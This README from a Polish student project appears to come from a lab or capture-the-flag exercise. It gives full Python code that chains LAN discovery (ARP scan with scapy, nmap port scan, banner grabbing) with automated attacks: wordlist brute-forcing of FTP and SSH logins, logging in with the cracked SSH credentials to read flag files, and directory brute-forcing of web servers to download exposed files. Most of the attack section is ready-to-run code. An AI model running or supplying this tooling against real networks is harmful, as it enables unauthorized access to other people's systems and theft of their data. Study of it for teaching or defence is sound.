# Projekt 1 – Linux + Python
Poszczególne funkcje realizowane są przez osobne funkcje umieszczone w osobnych plikach.
Dodatkowe pakiety python wyszczególnione są w pliku requirements.txt

## Pkt. 1/2 ustalić własny adres IP, ustalić maskę podsieci 
Punkty te są realizowane za pomocą funkcji: `get_local_ip_param()`
Ustalanie adresu i maski odbywa się z wykorzystaniem pakietu ifcfg
Funkcja zwraca różne parametry interfejsu sieciowego, w zależności od podanych argumentów. W naszym przypadku jest to adres IP i maska. Plik getParameters.py


    def get_local_ip_param(ifname: str, inet=True, inet4=False, ether=False, inet6=False, netmask=False, 
    	netmasks=False, broadcast=False, broadcasts=False, prefixlens=False, device=False,flags = False, mtu=False ):
    	"""Gets specific ip parameters of specific network device
    
    	Args:
    		ifname (str): interface name
    		inet (bool, optional): ip address. Defaults to True.
    		inet4 (bool, optional): ip4 address as list. Defaults to False.
    		ether (bool, optional): ethernet address. Defaults to False.
    		inet6 (bool, optional): ip6 address as list. Defaults to False.
    		netmask (bool, optional): netmask. Defaults to False.
    		netmasks (bool, optional): netmask as list. Defaults to False.
    		broadcast (bool, optional): broadcast address. Defaults to False.
    		broadcasts (bool, optional): broadcast address as list. Defaults to False.
    		prefixlens (bool, optional): prefixlen. Defaults to False.
    		device (bool, optional): device name. Defaults to False.
    		flags (bool, optional): interface status. Defaults to False.
    		mtu (bool, optional): mtu value. Defaults to False.
    
    	Returns:
    		list: list of network parameters if value = True
    	"""
    	parameters = []
    	for name, interface in ifcfg.interfaces().items():
    		if name == ifname:
    			for key, value in interface.items():
    				if inet and key == 'inet':
    					parameters.append(value)
    				elif inet4 and key == 'inet4':
    					parameters.append(value)
    				elif ether and key == 'ether':
    					parameters.append(value)
    				elif inet6 and key == 'inet6': 
    					parameters.append(value)
    				elif netmask and key == 'netmask':
    					parameters.append(value)
    				elif netmasks and key == 'netmasks':
    					parameters.append(value)
    				elif broadcast and key == 'broadcast':
    					parameters.append(value)
    				elif broadcasts and key == 'broadcasts':
    					parameters.append(value)
    				elif prefixlens and key == 'prefixlens':
    					parameters.append(value)
    				elif device and key == 'device':
    					parameters.append(value)
    				elif flags and key == 'flags':
    					parameters.append(value)
    				elif mtu and key == 'mtu':
    					parameters.append(value)
    				else:
    					pass
    		else:
    			pass			
    	return parameters 

## Pkt. 3. Ustalić adresy IP innych aktywnych hostów w tej samej sieci
Aktywne hosty uzyskujemy jako rezultat wykonania funkcji `hosts_alive_list(ip_param: list)`
Jako argumenty wejściowe podajemy adres ip oraz maskę. Aktywne hosty wykrywamy za pomocą protokołu APR. Wykorzystujemy moduł scapy tworząc pakiet ether/arp i wiadomość srp. Funkcja zwraca listę aktywnych hostów.

Plik hosts2scan.py

https://www.thepythoncode.com/article/building-network-scanner-using-scapy

    def hosts_alive_list(ip_param: list):
        """Gets parameteres of host network device and calculate list of alive hosts in local network
    
        Args:
            ip_param (list): Expected: [ip_addr, netmask]
    
        Returns:
            list: list of alive hosts
        """
        from scapy.all import ARP, Ether, srp
        from netaddr import IPAddress
        target_ip = ip_param[0]+'/'+ str(IPAddress(ip_param[1]).netmask_bits()) # convert mask into bits
        # create ARP packet
        arp = ARP(pdst=target_ip)
        # create the Ether broadcast packet - ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        
        packet = ether/arp # stack them
        result = srp(packet, timeout=3, verbose=0)[0]
    
        # a list of clients, we will fill this in the upcoming loop
        clients = []
    
        for sent, received in result:
            # for each response, append ip address to `clients` list
            live_received = received.psrc
            if live_received != ip_param[0]: # remove local ip address
                clients.append(live_received)

    return clients

## Pkt. 4. Ustalić otwarte porty na wszystkich znalezionych hostach
Aktywne hosty skanujemy pod kątem otwartych portów w pętlach po adresach ip, oraz po zakresie portów wywołując obiekt klasy nmap.PortScanner().  Ograniczyliśmy skanowanie portów do zakresu 21-80. Funkcja drukuje na ekranie kolejne porty i ich status. Argument wejściowy to lista aktywnych hostów, zwraca słownik, gdzie kluczem jest adres ip, wartością jest lista otwartych portów. Funkcja `scan_hosts().`

Plik scanned.py

    import nmap
    
    def scan_hosts(ips: list) -> dict:
        """Gets the list of ip to scan, returns list of opened ports assign to specific ip address
        Uses nmap (need to be imported), method PortScaner().
        Run as root
    
        Args:
            ips (list): list of ip to scan
    
        Returns:
            dict: key: ip, value: list of opened ports
        """
        START_PORT = 21
        END_PORT = 80
        print("Scanning...")
        scanner = nmap.PortScanner()
        hosts_open_ports = {}
        for ip in ips:
            address = str(ip)
            ports_open = []
            for port in range (START_PORT, END_PORT + 1):
                resp = scanner.scan(address, str(port))
                resp = resp['scan'][address]['tcp'][port]['state']
                if resp == "open":
                    print(f'Host {address} port {port} is {resp}.')
                    ports_open.append(port)
                else:   #prints out closed ports
                    print(f'Host {address} port {port} is {resp}.')
            hosts_open_ports[address] = ports_open
        return hosts_open_ports

## Pkt. 5. Ustalić nazwę oraz wersję oprogramowania dla wszystkich usług na znalezionych hostach
Funkcja get_banner() pobiera słownik(), łączy się na poszczególne porty wysyła proste zapytanie i odczytuje odpowiedz. Dla portów 21,22 jest to prosta informacja o oprogramowaniu, dla portu 80, odpowiedz serwera http, z której wyciągamy sekcję Server: Logika funkcji opiera się na module socket.

Plik bannerGrabbing.py

    import socket
    
    def get_banner(addresses_ports: dict) -> None:
        """Function trying to discover software for opened ports and print it out
    
        Args:
            addresses_ports (dict): key: ip, value: list of opened ports
        """
    
        for addr_ip, ports_list in addresses_ports.items():
            if len(ports_list) == 0:
                print("Host: {addr_ip} no ports opened")
                continue
            for port in ports_list:
                print(port)
                try:
                    fd = socket.socket() # create socket
                    fd.connect((addr_ip, int(port))) #connect to ip/port
                    fd.settimeout(2)
                    query = "GET / HTTP/1.1\nHost: " + addr_ip + "\n\n" # making query
                    fd.send(query.encode()) # send query to server 
                    receive = fd.recv(2048).decode() # receive 2048 bytes
                    if port == 80:    #if port 80 / http - parsing the answer
                        lines = receive.splitlines()
                        for line in lines:
                            if line.startswith("Server:"):
                                receive = line
                  
                    print(f"Host: {addr_ip} port: {port} software: {receive}")
                
                except socket.error:
                    print(f"Host: {addr_ip} port: {port}")
                    print("Socket error", socket.error) # exception in case port is close
                finally:
                    fd.close()

# Pkt. 6. Przeprowadzić manualną analizę jednej z usług
W ostatniej części zautomatyzowaliśmy proces przeprowadzenia ataku brute force na porty 21 – FTP i SSH – 22, oraz na usługę HTTP - 80. Metoda brute_force() wykrzystuje trzy podmetody wywoływane w zależności od atakowanego portu. Dla FTP – brute_force_FTP() wykorzystuje moduł ftplib, dla SSH – brute_force_SSH() – moduł paramiko, dla HTTP metody
Efekt działania wyświetlany jest na bieżąco, oraz zapisywany w słowniku odpowiednio FTP_credentials oraz SSH_credentials. Dla usługi SSH dodatkowo wykorzystujemy metodę: read_remote_files(), która wykorzystując zdobyte uprawnienia loguje się na zdalny koncie i odczytuje pliki *.txt, w których przechowywane są flagi.
Dla usługi HTTP odczytujemy odpowiedzi serwera przy próbie wejścia na katalogi lub podkatalogi wykrzystując słownik `directory-list-lowercase-2.3-medium.txt`. Otrzymujemy strony ze status_code = 200, na których wyświetlane są katalogi i pliki. Wykorzystując metodę zapisujemy te pliki na lokalnym dysku.

Plik bruteForce.py

    import paramiko
    import ftplib
    import time
    import socket
    import requests
    import logging
    from logging import NullHandler
    from bs4 import BeautifulSoup
    import shutil
    import os
    
    def brute_force_FTP(targetIP: str) -> None:
        """Gets ip address and tries to login to FTP server 
        users and passwords from file
        uses module ftplib.FPT()
        Args:
            targetIP (str): ip address
        Returns: FTP_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
        """
        print(f"Calling brute_force_FTP on {targetIP}")
    
        # files: users and passwords operations
        
        password_file = "passwd.txt"
        users_file = "users.txt"
        users = open(users_file)
        passwds = open(password_file)
        users_list = users.readlines()
        pass_list = passwds.readlines()
        users.close()
        passwds.close()
    
        ftpServer = ftplib.FTP()
        FTP_credentials = {}
        user_pass = []
    
        for user in users_list:
            user = user.strip()
            for passwd in pass_list:
                passwd = passwd.strip()
                try:
                    print(f"Trying: {user}: {passwd}")
                    ftpServer.connect(targetIP, 21, timeout=1000)
                    ftpServer.login(user, passwd)
                    print(f"[+] Found combo for FTP:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
                    user_pass.append([user, passwd])
                    FTP_credentials[targetIP] = user_pass
                    ftpServer.close()
                except Exception as error:
                    print(f"[!] {error}")
        return FTP_credentials
    
    def try_connect(hostname, username, password, port=22) -> dict:
        """Tries to connect on SSH port using arguments
        Args:
            hostname (str): hostname
            username (str): username
            password (str): password
            port (int, optional): port number Defaults to 22
        Returns:
            dict: dict consists of three parameters: ip, user and password if those are valid otherwise returns False:bool
        """
        logging.getLogger('paramiko.transport').addHandler(NullHandler())
        # initialize SSH client
        client = paramiko.SSHClient()
        # add to know hosts
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=hostname, username=username, password=password, timeout=10, port=port)
        except socket.timeout:
            # this is when host is unreachable
            print(f"[!] Host: {hostname} is unreachable, timed out.")
            return False
        except paramiko.AuthenticationException:
            print(f"[!] Invalid credentials for {username}:{password}")
            return False
        except paramiko.SSHException:
            print(f"[*] Quota exceeded, retrying with delay...")
            # sleep for ten seconds
            time.sleep(10)
            return try_connect(hostname, username, password, port)
        else:
            # connection was established successfully
            print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
            return {'hostname' : hostname, 'username' : username, 'password' : password}
    
    def brute_force_SSH(targetIP: str) -> dict:
        """Gets ip address and tries to login to SSH server 
        users and passwords from file
        uses module paramiko.SSHClient()
        Args:
            targetIP (str): ip address    
        Returns: SSH_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
        """
        print(f"Calling: brute_force_SSH on {targetIP}")
    
        # files: users and passwords operations
        
        password_file = "passwd.txt"
        passwds = open(password_file)
        pass_list = passwds.readlines()
        passwds.close()
    
        users_file = "users.txt"
        users = open(users_file)
        users_list = users.readlines()
        users.close()
    
        SSH_credentials = {}
        user_pass = []
    
        for user in users_list:
            user = user.strip()
            for passwd in pass_list:
                passwd = passwd.strip()
                if try_connect(targetIP, user,passwd):
                    user_pass.append([user,passwd])
                    break
            
        SSH_credentials[targetIP] = user_pass
        return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system
    
    def read_remote_files(SSH_credentials: dict) -> None:
        """Reads all txt files. From txt files print content
        Args: SSH_credentials (dict): key: ip address, value: list of lists consists of pair: user/pass
        """
        # initialize SSH client
        sshserver = paramiko.SSHClient()
        # add to know hosts
        sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
        sshserver.load_system_host_keys()
        for ip, user_pass in SSH_credentials.items():
            for user, passwd in user_pass:
                # print (ip, user, passwd)
                try:
                    sshserver.connect(hostname=ip, username=user, password=passwd, timeout=5)
                    ls_command = 'ls -a'
                    stdin, stdout, stderr = sshserver.exec_command(ls_command)
                    list_of_files = stdout.readlines()
                    # print(list_of_files)
                    for file in list_of_files:
                        file = file.replace('\n','')
                        if  '.txt' in file:
                            cat_command = 'cat ' + file
                            stdin, stdout, stderr = sshserver.exec_command(cat_command)
                            print(f"[+] Host:{ip} User:{user} flaga: {stdout.readlines()[0].strip()} w pliku: {file}")
                    sshserver.close()
                except socket.timeout:
                    # this is when host is unreachable
                    print(f"[!] Host: {ip} is unreachable, timed out.")
    
    # ========= http attack ===========
    
    def make_links(url:str) -> list:
        """From ip address and words from dictionary on linux kali disc makes list of links (ip/path) to check
        Args:
            url (str): ip address
        Returns:
            list: list of links to check
        """
        links = []
        # WORDLIST = "/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt"
        WORDLIST = "/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-very-small.txt"
        with open(WORDLIST, errors='ignore') as stream:
            directories = stream.read().split("\n")
        for directory in directories:
            if not directory.startswith('#') and not directory.startswith('?') and directory !='':
                link = url + '/' + directory
                links.append(link)
        # print(links)
        return links # list of links to check
    
    def check_http_response(links: list) -> list:
        """Get list of links and using requests module checks whether gets return code 200 or not.
        Args:
            links (list): list of links to check
        Returns:
            list: list of proper links, where status code was 200
        """
        links_200_ok = []
        for link in links:
            response = requests.get(link)
            if response.ok: # response = 200
                links_200_ok.append(link)    
        return links_200_ok
    
    def update_links(links: list) -> list:
        """Adds next level files to list: links_200_ok
        Args:
            links (list): links_200_ok
        Returns:
            list: complet list of proper links
        """
        links_200_ok = check_http_response(links)
        for link in links_200_ok:
            next_level = make_links(link)
            next_level_links_200_ok = check_http_response(next_level)
            links_200_ok.extend(next_level_links_200_ok)
        return links_200_ok
    
    def get_page(link: str) -> dict:
        """From page under link gets list of files if page starts with title: "Index of"
        Args:
            link (str): full link ip/path
        Returns:
            dict: key: link, value: list of files on the page
        """
        list_of_file = []
        response = requests.get(link).text
        soup = BeautifulSoup(response, "html.parser")
    
        title = str(soup.findAll("title"))
        if 'Index of' in str(title):
            for res in soup.findAll("a", {'href': True}): # szukamy odnosnikow
                file = res.get('href') # pobieramy odnosnik
                if file[-1] != "/" and file[0] != "?":
                    list_of_file.append(file)
            return {'link': link,  'files': list_of_file}
        else:
            return {}
    
    def get_file(link_files: dict) -> None:
        """Function gets dict which consists of link and list of files and downloads them on local disc
        It writes them to 'ip_from_link' directory
        Args:
            link_files (dict): key: link, value: list of filenames with extension
        """
        if link_files['link']:
            link = link_files['link']
            files = link_files['files']
            dir_name = "-".join(link.split("/")[3:]) # directory name
            dir_main = link.split("/")[2] # ip address
            if not os.path.isdir(dir_main):
                os.mkdir(dir_main)
            os.chdir(dir_main)
            # print(dir_name)
            if dir_name != '':
                shutil.rmtree(dir_name, ignore_errors=True)
                os.mkdir(dir_name)
            else:
                shutil.rmtree("root", ignore_errors=True)
                os.mkdir("root")
            for file in files:
                response = requests.get(link + "/" + file)
                open(dir_name + "/" + file, "wb").write(response.content)
                print("[+] File:", file, "written in dir:", dir_name)
            os.chdir('..')
    
    def attack_http(targetIP:str) -> dict:
        """Collects other function to carry out an attack
        Args:
            targetIP (str): ip address
        Returns:
            file_list (dict): key: link, value: list of files on the page
        """
        print("Calling HTTP attack ...")
        links_to_check = make_links("http://" + targetIP)
        links_200_ok = update_links(links_to_check)
        for link in links_200_ok:
            file_list = get_page(link)
            get_file(file_list)
        return file_list
    
    def brute_force(hosts_ports_list: dict):
        for ip_addr, ports in hosts_ports_list.items():
            for port in ports:
                if port == 21:
                    print(brute_force_FTP(ip_addr))
                if port == 22:
                    SSH_cred = brute_force_SSH(ip_addr)
                    if SSH_cred:
                        read_remote_files(SSH_cred)
                if port == 80:
                    attack_http(ip_addr)
                    print("Success!")
                   
=== koniec ===











